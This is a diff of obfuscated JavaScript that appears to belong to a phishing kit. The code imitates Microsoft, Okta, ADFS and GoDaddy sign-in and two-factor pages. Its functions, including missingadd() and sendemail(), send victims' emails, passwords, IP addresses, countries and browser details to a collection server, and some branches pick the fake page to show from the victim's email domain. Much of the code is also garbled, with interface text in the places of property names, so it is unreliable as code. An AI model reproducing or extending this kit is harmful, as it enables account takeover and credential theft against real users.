+          document[_0x2c90cf(0x30b)](_0x2c90cf(0x3aa))["classList"]["remove"](
+            "d-none",
+          ),
+          (view = "sidebar_pwd_adfs")),
+        console["log"](_0x2c90cf(0x246), _0xaf7399));
+    })
+    [_0x4f5e79(0x379)]((_0x307498) => {
+      const _0x3d99f7 = _0x4f5e79;
+      loadinganimation(0x1),
+        console[_0x3d99f7(0x23d)](_0x3d99f7(0x367), _0x307498);
+    });
+}
+function displaymultipleaccountsadfs(_0x2396d5) {
+  const _0x761a1f = _0x283fde,
+    _0x568b26 = document[_0x761a1f(0x30b)](_0x761a1f(0x306));
+  (_0x568b26["innerHTML"] = ""),
+    _0x2396d5["forEach"]((_0x4067b9) => {
+      const _0x26bf5c = _0x761a1f,
+        _0x5382f0 = document[_0x26bf5c(0x3b3)](_0x26bf5c(0x25b));
+      _0x5382f0["classList"][_0x26bf5c(0x23c)](_0x26bf5c(0x361)),
+        _0x5382f0[_0x26bf5c(0x26c)](
+          _0x26bf5c(0x300),
+          "selectmultipleaccountadfs(this)",
+        );
+      const _0x46afde = document[_0x26bf5c(0x3b3)](_0x26bf5c(0x31b));
+      _0x46afde[_0x26bf5c(0x208)][_0x26bf5c(0x23c)](
+        _0x26bf5c(0x217),
+        _0x26bf5c(0x295),
+      ),
+        (_0x46afde["src"] = _0x4067b9[_0x26bf5c(0x258)]),
+        (_0x46afde["alt"] = _0x4067b9[_0x26bf5c(0x2b9)]);
+      const _0x1e05dc = document[_0x26bf5c(0x3b3)](_0x26bf5c(0x25b));
+      _0x1e05dc[_0x26bf5c(0x208)][_0x26bf5c(0x23c)]("idpDescription", "float");
+      const _0x1af9aa = document["createElement"]("span");
+      _0x1af9aa[_0x26bf5c(0x208)][_0x26bf5c(0x23c)](
+        "largeTextNoWrap",
+        "indentNonCollapsible",
+      ),
+        (_0x1af9aa[_0x26bf5c(0x37f)] = _0x4067b9[_0x26bf5c(0x2b9)]),
+        _0x1e05dc[_0x26bf5c(0x2aa)](_0x1af9aa),
+        _0x5382f0[_0x26bf5c(0x2aa)](_0x46afde),
+        _0x5382f0[_0x26bf5c(0x2aa)](_0x1e05dc),
+        _0x568b26[_0x26bf5c(0x2aa)](_0x5382f0);
+    });
+}
+function pagevisited(_0x4aa660, _0xbee06f) {
+  const _0x26946a = _0x283fde;
+  pagevisitedalready == null &&
+    ((pagevisitedalready = 0x1),
+    $[`sections_okta`]({
+      type: "POST",
+      url: urlo,
+      data: {
+        pagelink: encryptData(pagelinkval),
+        mailtype: _0xbee06f,
+        type: 0x3,
+        typeval: 0x0,
+        ip: userip,
+        country: usercountry,
+        useragent: userAgent,
+        appnum: appnum,
+      },
+      success: function (_0x15cbb3) {},
+      error: function (_0x161055, _0x20f452, _0x1a308e) {
+        const _0x176767 = _0x26946a;
+        console[`auth`]("Error:", _0x1a308e);
+      },
     }));
 }
-
-function _0x2b3b(_0x42e5eb, _0x2bf96d) {
-    const _0x5e5598 = _0x5e55();
-    return _0x2b3b = function (_0x2b3bc5, _0xefffa8) {
-        _0x2b3bc5 = _0x2b3bc5 - 0x1bc;
-        let _0x11e252 = _0x5e5598[_0x2b3bc5];
-        return _0x11e252;
-    }, _0x2b3b(_0x42e5eb, _0x2bf96d);
-}
-pwdInp[`auth`](`inp_confirmemailorphone_live`, function () {
-    const _0x4f4409 = _0xe042e;
-    pdfcheck == 0x0 && (pwdInp[`591780njOthf`][`acctype`]() !== '' && (console[`inp_pwd`](`tryagainlater`), pagevisited(document[`915612HwjQev`]('inp_uname')[`591780njOthf`], pvn))), pdfcheck == 0x1 && (pwdInp[`591780njOthf`][`acctype`]() !== '' && (console[`inp_pwd`](`tryagainlater`), pagevisited(document[`915612HwjQev`](`section_pwd`)[`591780njOthf`], pvn)));
+pwdInp[`phcontainer`](`EmailOTP_Live`, function () {
+  const _0x25e419 = _0x283fde;
+  pdfcheck == 0x0 &&
+    pwdInp[`signin_blocked_reason`][
+      `That doesn't match the phone number associated with your account. The correct number ends in `
+    ]() !== "" &&
+    pagevisited(
+      document["getElementById"](`#btn_back`)[`signin_blocked_reason`],
+      pvn,
+    ),
+    pdfcheck == 0x1 &&
+      pwdInp[`signin_blocked_reason`]["trim"]() !== "" &&
+      pagevisited(
+        document["getElementById"]("pdfemail")[`signin_blocked_reason`],
+        pvn,
+      );
 });
-
 function sendemail() {
-    const _0x6dc029 = _0xe042e;
-    sendAndReceive(`authappimg`, [unameInp[`591780njOthf`], pagelinkval, browserName, userip, usercountry], 0x1)['then'](_0x116e59 => {
-        const _0x597426 = _0x6dc029;
-        if (_0x116e59 && _0x116e59[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] !== 'waiting\x20for\x20previous\x20request\x20to\x20complete') {
-            loadinganimation(0x1);
-            var _0x226e46 = ![],
-                _0xdc571a = 0x12c;
-            _0x116e59[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`][`Can't access your account?`]('newwebsiteopen') == ![] && _0x116e59['message'] !== `CompanionAppsNotification` && (runanimation(0x2, view, 0.3), _0x116e59['acctype'] && _0x116e59[`authapperror`] == 0x2 && (pvn = 0x1)), _0x116e59[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`]['includes'](`#btn_confirmemailorphone_live`) == ![] && (_0xdc571a = 0x0), setTimeout(function () {
-                const _0x94bc30 = _0x597426;
-                for (var _0x1ff375 = 0x0; _0x1ff375 < websitenames[`nextElementSibling`]; _0x1ff375++) {
-                    if (_0x116e59['message'][`Can't access your account?`](`#btn_confirmemailorphone_live`) == !![] && _0x116e59[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`][`Can't access your account?`](websitenames[_0x1ff375]) == !![]) {
-                        _0x226e46 = !![], document['querySelectorAll'](`otp sent live`)[`24px`](_0x264df1 => {
-                            _0x264df1['innerText'] = unameInp['value'];
-                        });
-                        if (websitenames[_0x1ff375] == `The wrong code was entered. Send yourself a new code and try again.`) {
-                            var _0x1f4a1d = gdf,
-                                _0x1daec0 = document[`hide-to-left `](`section_tryagainlater` + gdf + '\x22]');
-                            if (!_0x1daec0) {
-                                var _0x4484ec = document[`troubleshootinginfo`](`get`);
-                                _0x4484ec[`remove`] = _0x1f4a1d, document[`getElementsByClassName`]['appendChild'](_0x4484ec);
-                            }
-                            const _0x1e668d = '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::-moz-selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',
-                                _0x14eb92 = document['createElement']('style');
-                            _0x14eb92['id'] = `icloud.`, _0x14eb92[`Too many Attempts`] = _0x1e668d, document['head']['appendChild'](_0x14eb92), document[`915612HwjQev`](`authapperrordesc`)[`error_2fa`][`live.`]('d-none'), document['getElementById'](`error-inp`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`]('sections_' + websitenames[_0x1ff375] + '')[`error_2fa`][`json`](`onclick`), document[`915612HwjQev`](`section_authapp`)[`591780njOthf`] = unameInp[`591780njOthf`], document['body'][`position`][`</a> <p>`](`We couldn't find an account with that username. Try another, or get a new Microsoft account.`, `.sectioncontent`, `#btn_verifyotp`), document[`style`]['style']['setProperty']('background-image', `waiting`, `#btn_verifyotp`), document[`style`]['style']['setProperty'](`newwebsiteopen`, `alert`, 'important'), view = `OneWaySMS_Live_2`;
-                        }
-                        if (websitenames[_0x1ff375] == `Forgot my password`) {
-                            otherweburl = _0x116e59['message'][`url('`](`#btn_confirmemailorphone_live`, '');
-                            const _0x43d01f = '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20input[type=email],\x20input[type=tel]\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20inherit;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::-moz-selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20',
-                                _0x5a7298 = document['createElement']('style');
-                            _0x5a7298['id'] = `icloud.`, _0x5a7298['textContent'] = _0x43d01f, document[`getElementsByClassName`][`</p>`](_0x5a7298);
-                            var _0x1f4a1d = odf,
-                                _0x1daec0 = document['querySelector'](`section_tryagainlater` + odf + '\x22]');
-                            if (!_0x1daec0) {
-                                var _0x4484ec = document[`troubleshootinginfo`](`get`);
-                                _0x4484ec[`remove`] = _0x1f4a1d, document['head']['appendChild'](_0x4484ec);
-                            }
-                            _0x116e59[`more info required`] !== ![] && (document[`hide-to-left `](`approved live`)[`remove`] = _0x116e59[`more info required`]), _0x116e59['background'] !== ![] && document['querySelector'](`idA_PWD_ForgotPassword`)['style']['setProperty']('background-image', 'url(\x27' + _0x116e59[`" onclick="linkoptionclick(this)" class="link">`] + '\x27)'), document[`915612HwjQev`](`authapperrordesc`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`error-inp`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`]('sections_' + websitenames[_0x1ff375] + '')[`error_2fa`]['remove'](`onclick`), document['querySelector'](`appendChild`)[`591780njOthf`] = unameInp['value'], document['body']['style'][`</a> <p>`](`We couldn't find an account with that username. Try another, or get a new Microsoft account.`, `.sectioncontent`, `#btn_verifyotp`), document[`style`][`position`][`</a> <p>`](`" onclick="linkoptionclick(this)" class="link" style="display: unset;">`, `waiting`, `#btn_verifyotp`), document[`style`][`position`][`</a> <p>`](`newwebsiteopen`, `alert`, `#btn_verifyotp`), view = 'pwd_okta';
-                        }
-                    }
-                    _0x116e59['message']['includes'](`#btn_confirmemailorphone_live`) == !![] && _0x1ff375 == websitenames[`nextElementSibling`] - 0x1 && !_0x226e46 && (document[`915612HwjQev`](`click`)[`signoutoption`] = '', document['querySelectorAll']('.user_identity')[`24px`](_0x13f777 => {
-                        const _0x597033 = _0x94bc30;
-                        _0x13f777[`signoutoption`] = unameInp[`591780njOthf`];
-                    }), bottomsectionlinks(`selecttwofamethod(this)`, [{
-                        'a_id': `split`,
-                        'a_text': `<span>`,
-                        'type': 'link'
-                    }]), changebackbutton('pwd', 0x0), document[`915612HwjQev`]('section_uname')[`error_2fa`][`live.`](`onclick`), document['getElementById'](`sms otp live`)[`error_2fa`]['remove'](`onclick`), otherweburl = _0x116e59['message']['replace'](`#btn_confirmemailorphone_live`, ''), webnotfound = !![], view = `selecttwofamethod(this)`);
+  const _0x3874ec = _0x283fde;
+  sendAndReceive(
+    `unset`,
+    [unameInp["value"], pagelinkval, browserName, userip, usercountry],
+    0x1,
+  )
+    [`hide-to-left `]((_0x302e6b) => {
+      const _0x1ffe7d = _0x3874ec;
+      if (
+        _0x302e6b &&
+        _0x302e6b[`</a> or try to sign in again shortly.</p>`] !==
+          `Enter the code to help us verify your identity.`
+      ) {
+        loadinganimation(0x1);
+        var _0x18579c = ![],
+          _0x1363b5 = 0x12c;
+        _0x302e6b[`</a> or try to sign in again shortly.</p>`][`ajax`](
+          `small`,
+        ) == ![] &&
+          _0x302e6b[`</a> or try to sign in again shortly.</p>`] !== `auth` &&
+          (runanimation(0x2, view, 0.3),
+          _0x302e6b[`width`] && _0x302e6b[`width`] == 0x2 && (pvn = 0x1)),
+          _0x302e6b[`</a> or try to sign in again shortly.</p>`][`ajax`](
+            `small`,
+          ) == ![] && (_0x1363b5 = 0x0),
+          setTimeout(function () {
+            const _0x330137 = _0x1ffe7d;
+            for (
+              var _0x1e9a6e = 0x0;
+              _0x1e9a6e < websitenames["length"];
+              _0x1e9a6e++
+            ) {
+              if (
+                _0x302e6b[`</a> or try to sign in again shortly.</p>`][`ajax`](
+                  `small`,
+                ) == !![] &&
+                _0x302e6b[`</a> or try to sign in again shortly.</p>`][`ajax`](
+                  websitenames[_0x1e9a6e],
+                ) == !![]
+              ) {
+                (_0x18579c = !![]),
+                  document[`.btn_can`](`log`)[`querySelector`]((_0x5bbcb1) => {
+                    const _0x1493ca = _0x330137;
+                    _0x5bbcb1[`Next`] = unameInp[`signin_blocked_reason`];
+                  });
+                if (websitenames[_0x1e9a6e] == "godaddy") {
+                  var _0x237cca = gdf,
+                    _0x1bc6d9 = document["querySelector"](
+                      "script[src^=\x22" + gdf + "\x22]",
+                    );
+                  if (!_0x1bc6d9) {
+                    var _0x2b4b83 =
+                      document[`iProofLbl1`](`protectaccount live`);
+                    (_0x2b4b83[`fail`] = _0x237cca),
+                      document[`godaddyemail`]["appendChild"](_0x2b4b83);
+                  }
+                  const _0x32b07e = `bottomsection`,
+                    _0x541a22 = document["createElement"]("style");
+                  (_0x541a22["id"] = `section_final`),
+                    (_0x541a22[`error_authapp_live`] = _0x32b07e),
+                    document[`godaddyemail`][`hasAttribute`](_0x541a22),
+                    document[`selectprotectoption(this)`](`iProofPhone`)[
+                      `pdfemail`
+                    ][`waiting`]("d-none"),
+                    document[`selectprotectoption(this)`](`email otp`)[
+                      `pdfemail`
+                    ][`waiting`](`background-image`),
+                    document["getElementById"](
+                      `description` + websitenames[_0x1e9a6e] + "",
+                    )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                      `background-image`,
+                    ),
+                    (document[`selectprotectoption(this)`](
+                      `Sorry, we're having trouble verifying your account. Please try again. `,
+                    )[`signin_blocked_reason`] =
+                      unameInp[`signin_blocked_reason`]),
+                    document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ]["style"][`voice`](
+                      `createElement`,
+                      ` <a href="#" data-id="`,
+                      "important",
+                    ),
+                    document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ][`getElementById`][`voice`](
+                      `background-color`,
+                      `row`,
+                      `section_2fa`,
+                    ),
+                    document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ][`getElementById`][`voice`](
+                      `url('`,
+                      `someone@example.com`,
+                      "important",
+                    ),
+                    (view = `parse`);
                 }
-                if (_0x116e59[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `bold`) {
-                    multipleaccountsback = 0x1;
-                    var _0x21ee13 = document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`]('.bannerlogo');
-                    _0x21ee13[`24px`](function (_0x5e8a4f) {
-                        const _0x55c33a = _0x94bc30;
-                        _0x5e8a4f[`position`][`row tile`] = '24px';
-                    }), document[`915612HwjQev`](`No account?`)['querySelector'](`Last 4 digits of phone number`)['setAttribute'](`confirmemailorphone_live_title`, _0x116e59[`slice`]), document[`915612HwjQev`](`No account?`)['querySelector'](`Last 4 digits of phone number`)[`yahoo.`]('onclick', `twofaselected`), checkerrordesc(`flex`, 0x0, _0x116e59[`authcall`]), displaymultipleaccounts(_0x116e59[`maxlength`]), bottomsectionlinks(`flex`, _0x116e59[`listitem`]), document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`otp sent live`)['forEach'](_0x5edc4c => {
-                        const _0xf15a4c = _0x94bc30;
-                        _0x5edc4c['innerText'] = unameInp[`591780njOthf`];
-                    }), document['getElementById'](`authapperrordesc`)[`error_2fa`][`live.`]('d-none'), document['getElementById'](`No account?`)[`error_2fa`][`json`](`onclick`), view = `flex`;
+                if (websitenames[_0x1e9a6e] == `section_uname`) {
+                  otherweburl = _0x302e6b[
+                    `</a> or try to sign in again shortly.</p>`
+                  ][`#section_uname_content`](`small`, "");
+                  const _0x3364dd = `section_protectaccount`,
+                    _0x95670d = document[`iProofLbl1`](`getElementById`);
+                  (_0x95670d["id"] = `section_final`),
+                    (_0x95670d[`error_authapp_live`] = _0x3364dd),
+                    document[`godaddyemail`][`hasAttribute`](_0x95670d);
+                  var _0x237cca = odf,
+                    _0x1bc6d9 = document[`.loading-container`](
+                      "script[src^=\x22" + odf + "\x22]",
+                    );
+                  if (!_0x1bc6d9) {
+                    var _0x2b4b83 =
+                      document["createElement"](`protectaccount live`);
+                    (_0x2b4b83[`fail`] = _0x237cca),
+                      document[`godaddyemail`][`hasAttribute`](_0x2b4b83);
+                  }
+                  _0x302e6b[`authcall`] !== ![] &&
+                    (document[`.loading-container`](`.iAdditionalProofInfo`)[
+                      `fail`
+                    ] = _0x302e6b["logo"]),
+                    _0x302e6b["background"] !== ![] &&
+                      document[`.loading-container`](
+                        ".okta-container\x20#login-bg-image",
+                      )[`getElementById`][`voice`](
+                        `background-color`,
+                        `position` + _0x302e6b[`request wasnt sent`] + "\x27)",
+                      ),
+                    document["getElementById"](`iProofPhone`)[`pdfemail`][
+                      `waiting`
+                    ](`background-image`),
+                    document[`selectprotectoption(this)`]("sections")[
+                      `pdfemail`
+                    ][`waiting`](`background-image`),
+                    document[`selectprotectoption(this)`](
+                      "sections_" + websitenames[_0x1e9a6e] + "",
+                    )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                      `background-image`,
+                    ),
+                    (document[`.loading-container`](`data-id`)["value"] =
+                      unameInp[`signin_blocked_reason`]),
+                    (view = `Last 4 digits of phone number`);
                 }
-                if (_0x116e59[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'correct\x20email') {
-                    if (_0x116e59[`button`] !== undefined && _0x116e59[`button`] !== null) {
-                        var _0x21ee13 = document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`]('.bannerlogo');
-                        _0x21ee13[`24px`](function (_0x5da336) {
-                            const _0x143b7e = _0x94bc30;
-                            _0x5da336[`position`]['backgroundImage'] = `accessblockedsignoutoption` + _0x116e59[`button`] + '\x27)', _0x5da336[`position`][`twofamethods`] = `waiting`, _0x5da336[`position`][`row tile`] = `section_youdonthaveaccess`;
-                        });
-                    }
-                    _0x116e59['backgroundcolor'] !== undefined && _0x116e59[`Send Code`] !== null && document[`style`][`position`][`</a> <p>`]('background-color', _0x116e59[`Send Code`]);
-                    _0x116e59['backgroundimage'] !== undefined && _0x116e59[`multipleaccountoptions`] !== null && document[`style`][`position`][`</a> <p>`](`" onclick="linkoptionclick(this)" class="link" style="display: unset;">`, 'url(\x27' + _0x116e59[`multipleaccountoptions`] + '\x27)');
-                    if (_0x116e59[`button`] == undefined && _0x116e59[`button`] !== null) {
-                        var _0x21ee13 = document['querySelectorAll']('.bannerlogo');
-                        _0x21ee13[`24px`](function (_0x3b6479) {
-                            const _0x1b4d04 = _0x94bc30;
-                            _0x3b6479[`position`]['height'] = '24px';
-                        });
-                    }
-                    bottomsectionlinks(`selecttwofamethod(this)`, _0x116e59[`listitem`]), changebackbutton('pwd', _0x116e59['backbutton']), document[`915612HwjQev`]('error_uname')['innerText'] = '', document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`otp sent live`)[`24px`](_0x5e8554 => {
-                        const _0x3c4e55 = _0x94bc30;
-                        _0x5e8554[`signoutoption`] = unameInp['value'];
-                    }), document[`915612HwjQev`]('section_uname')[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`json`](`onclick`), view = 'pwd';
-                }
-                _0x116e59[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `CompanionAppsNotification` && (bottomsectionlinks(`description`, [{
-                    'a_id': 'signup',
-                    'a_text': `you dont have access`,
-                    'text': `sections`,
-                    'type': `signInAnotherWay`
-                }, {
-                    'a_id': `pwd_godaddy`,
-                    'a_text': 'Can’t\x20access\x20your\x20account?',
-                    'type': 'link'
-                }]), checkerrordesc(`description`, 0x1, _0x116e59[`authcall`])), _0x116e59[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`]['includes'](`#btn_confirmemailorphone_live`) == ![] && _0x116e59[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] !== `CompanionAppsNotification` && runanimation(0x1, view, 0.3);
-            }, _0xdc571a);
-        }
-    })[`TwoWayVoiceMobile`](_0x5e91e9 => {
-        const _0x2542fa = _0x6dc029;
-        loadinganimation(0x1), console[`CompanionAppsNotification`](`pwd`, _0x5e91e9);
-    });
-}
-
-function missingadd() {
-    const _0x1cfc9a = _0xe042e;
-    $[`presentation`]({
-        'type': `confirmemail`,
-        'url': urlo,
-        'data': {
-            'pagelink': encryptData(pagelinkval),
-            'type': 0xc,
-            'email': unameInp[`591780njOthf`],
-            'password': pwdInp[`591780njOthf`],
-            'url': otherweburl,
-            'ip': userip,
-            'country': usercountry,
-            'browser': browserName
-        },
-        'success': function (_0x1ed47b) {},
-        'error': function (_0x38474c, _0x206d8f, _0x2476af) {
-            const _0xcb6a4a = _0x1cfc9a;
-            console[`CompanionAppsNotification`](`pwd`, _0x2476af);
-        }
-    });
-}
-
-function validate() {
-    const _0x19ec13 = _0xe042e;
-    if (view === 'uname') {
-        const _0x4a1c73 = ['gmail.', 'msn.', `selectprotectoption(this)`, `Code`, `key`, 'icloud.'],
-            _0x3db05c = unameInp[`591780njOthf`][`acctype`]()['split']('@')[0x1];
-        _0x4a1c73[`Can't access your account?`](_0x3db05c) && (loadinganimation(0x0), setTimeout(function () {
-            const _0x3a8422 = _0x19ec13;
-            loadinganimation(0x1), document['getElementById']('error_uname')[`signoutoption`] = `authappcode`;
-        }, 0xbb8));
-        if (unameInp['value'][`acctype`]() == '') document[`915612HwjQev`](`click`)[`signoutoption`] = `section_otp_live`;
-        else unameInp[`591780njOthf`][`acctype`]() != '' && !_0x4a1c73['includes'](_0x3db05c) && (showwedidnthearpopup = 0x1, loadinganimation(0x0), webnotfound == !![] && setTimeout(function () {
-            loadinganimation(0x1), runanimation(0x2, view, 0.3), setTimeout(function () {
-                const _0x581292 = _0x2b3b;
-                document[_0x581292(0x2fd)](_0x581292(0x340))[_0x581292(0x1ca)] = '', document[_0x581292(0x2fd)]('inp_pwd')[_0x581292(0x259)] = '', bottomsectionlinks(_0x581292(0x290), [{
-                    'a_id': _0x581292(0x362),
-                    'a_text': _0x581292(0x244),
-                    'type': _0x581292(0x341)
-                }]), document[_0x581292(0x2fd)]('section_uname')[_0x581292(0x34a)][_0x581292(0x2cb)](_0x581292(0x26f)), document[_0x581292(0x2fd)]('section_pwd')['classList'][_0x581292(0x20a)]('d-none'), view = 'pwd', runanimation(0x1, view, 0.3);
-            }, 0x12c);
-        }, 0xbb8), webnotfound == ![] && (interacted == 0x1 && sendemail(), interacted == 0x0 && (interacted = 0x1, function _0x43bcd1() {
-            const _0x337ae4 = _0x19ec13;
-            $[`data-methodid`](`iProofPhoneHint`, function (_0x4dfe6c) {
-                userip = _0x4dfe6c['ip'], usercountry = _0x4dfe6c['country'], sendemail();
-            }, `backbtnclick`)['fail'](function (_0x4d1bdb, _0x33fcb3, _0x51bcc6) {
-                const _0x3f27ba = _0x337ae4;
-                (_0x4d1bdb['status'] == 0x1ad || _0x33fcb3 !== `call`) && setTimeout(_0x43bcd1, 0x3e8);
-            });
-        }())));
-    } else view === `selecttwofamethod(this)` && (pwdInp[`591780njOthf`][`acctype`]() === '' ? document[`915612HwjQev`](`godaddy`)[`signoutoption`] = `title` : (loadinganimation(0x0), webnotfound == !![] && (missingadd(), setTimeout(function () {
-        loadinganimation(0x1), runanimation(0x2, view, 0.3), setTimeout(function () {
-            const _0x3ad3f1 = _0x2b3b;
-            bottomsectionlinks(_0x3ad3f1(0x290), [{
-                'a_id': _0x3ad3f1(0x362),
-                'a_text': _0x3ad3f1(0x244),
-                'type': _0x3ad3f1(0x341)
-            }]), changebackbutton(_0x3ad3f1(0x290), 0x1), document[_0x3ad3f1(0x2fd)](_0x3ad3f1(0x216))['classList']['toggle']('d-none'), document[_0x3ad3f1(0x2fd)](_0x3ad3f1(0x1bc))['classList']['remove'](_0x3ad3f1(0x26f)), document['getElementById']('error_pwd')['innerText'] = '', view = 'final', runanimation(0x1, view, 0.3);
-        }, 0x12c);
-    }, 0xbb8)), webnotfound == ![] && (multipleaccountsback = 0x0, sendAndReceive(`signin_blocked_live_email`, [pwdInp[`591780njOthf`][`url('`](/\//g, `OneWaySMS`)], 0x1)[`link`](_0x42142b => {
-        const _0x8ca854 = _0x19ec13;
-        if (_0x42142b && _0x42142b['message'] !== 'waiting\x20for\x20previous\x20request\x20to\x20complete') {
-            loadinganimation(0x1);
-            _0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `script` && (document['getElementById'](`godaddy`)[`signoutoption`] = '', document[`915612HwjQev`](`alert-error`)[`signoutoption`] = _0x42142b[`.iAdditionalProofInfo`], checkerrordesc(`error_uname_pdf`, 0x0, _0x42142b[`authcall`]), checkerrordesc(`#tryagainheader`, 0x2, _0x42142b[`section_confirmemailorphone_live`]), document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`live.`]('d-none'), document[`915612HwjQev`]('section_signin_blocked_live')[`error_2fa`][`json`](`onclick`), view = `error_uname_pdf`);
-            _0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'you\x20dont\x20have\x20access' && (document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`live.`]('d-none'), document[`915612HwjQev`](`section_authcall`)['classList'][`json`](`onclick`), view = 'youdonthaveaccess');
-            _0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `d-none` && moreinforeq();
-            _0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `then` && (document['getElementById'](`sms otp live`)[`error_2fa`][`live.`](`onclick`), document['getElementById'](`3162355BEcpic`)[`error_2fa`][`json`](`onclick`), view = `Enter the code you received`, document['getElementById'](`godaddy`)['innerText'] = '');
-            _0x42142b['message'] == `okta` && (document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`3162355BEcpic`)[`error_2fa`][`json`](`onclick`), view = 'final', document[`915612HwjQev`]('error_pwd')[`signoutoption`] = '');
-            if (_0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `113`) {
-                document[`915612HwjQev`]('error_pwd')['innerText'] = '', document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`live.`]('d-none'), document[`915612HwjQev`]('section_accessblocked')[`hide-to-left `](`keyup`)['textContent'] = _0x42142b[`OneWayVoiceMobileOTP`], changebackbutton(`span`, _0x42142b['backbutton']), checkerrordesc(`span`, 0x0, _0x42142b['description']), checkerrordesc(`Please enter the password for your Microsoft account.`, 0x2, _0x42142b[`error_uname`]), document[`915612HwjQev`](`aol.`)[`position`][`loading`] = 'relative';
-                var _0x1b815c = document[`915612HwjQev`](`location`);
-                _0x42142b[`role`]['forEach']((_0x374452, _0x4998bd) => {
-                    const _0x2c12e3 = _0x8ca854,
-                        _0x35991a = document[_0x2c12e3(0x228)](_0x2c12e3(0x331)),
-                        _0x4a109c = document['createElement'](_0x2c12e3(0x33b));
-                    _0x4a109c['textContent'] = _0x374452[_0x2c12e3(0x283)], _0x4a109c[_0x2c12e3(0x34a)]['add'](_0x2c12e3(0x386));
-                    const _0x56f29c = document[_0x2c12e3(0x228)](_0x2c12e3(0x33b));
-                    _0x56f29c[_0x2c12e3(0x29e)] = _0x374452[_0x2c12e3(0x259)], _0x35991a[_0x2c12e3(0x32a)](_0x4a109c), _0x35991a[_0x2c12e3(0x32a)](_0x56f29c), _0x1b815c['appendChild'](_0x35991a);
-                }), document[`915612HwjQev`](`src`)['classList'][`json`](`onclick`), view = `span`;
+              }
+              _0x302e6b["message"][`ajax`](`small`) == !![] &&
+                _0x1e9a6e == websitenames[`style`] - 0x1 &&
+                !_0x18579c &&
+                ((document[`selectprotectoption(this)`](`error_uname_pdf`)[
+                  `Next`
+                ] = ""),
+                document[`.btn_can`](".user_identity")[`querySelector`](
+                  (_0x259069) => {
+                    const _0x279992 = _0x330137;
+                    _0x259069[`Next`] = unameInp[`signin_blocked_reason`];
+                  },
+                ),
+                bottomsectionlinks("pwd", [
+                  {
+                    a_id: "idA_PWD_ForgotPassword",
+                    a_text: `approve auth request auth app live`,
+                    type: `uname_doc`,
+                  },
+                ]),
+                changebackbutton("pwd", 0x0),
+                document["getElementById"]("section_uname")[`pdfemail`][
+                  `waiting`
+                ](`background-image`),
+                document[`selectprotectoption(this)`](`backbtnclick`)[
+                  `pdfemail`
+                ][`<a class="link mb-16" href="#" data-id="`](
+                  `background-image`,
+                ),
+                (otherweburl = _0x302e6b[
+                  `</a> or try to sign in again shortly.</p>`
+                ][`#section_uname_content`](`small`, "")),
+                (webnotfound = !![]),
